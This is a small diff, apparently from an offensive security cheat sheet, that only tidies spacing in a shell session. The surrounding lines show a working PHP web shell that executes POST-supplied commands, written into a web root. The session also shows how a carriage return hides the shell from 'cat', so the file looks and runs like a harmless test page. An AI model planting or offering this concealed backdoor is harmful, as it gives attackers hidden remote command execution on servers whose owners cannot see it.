@@ -1041,9 +1041,9 @@ Other methods:
 This method allows to hide from cat the malicious content of a file with a simple carriage return character: 
 ```sh
 bash$ echo -e "<?php if(isset(\$_POST[0])){\`\$_POST[0]\`;} ?>\r<?php echo \"hello world\"; echo \" this is a test\"; ?>" > /var/www/html/test.php
-bash$  cat test.php
+bash$ cat test.php
 <?php echo "hello world"; echo " this is a test"; ?>
-bash$  php test.php
+bash$ php test.php
 hello world this is a test
 bash$ strings test.php
 <?php if(isset($_POST[0])){`$_POST[0]`;} ?>
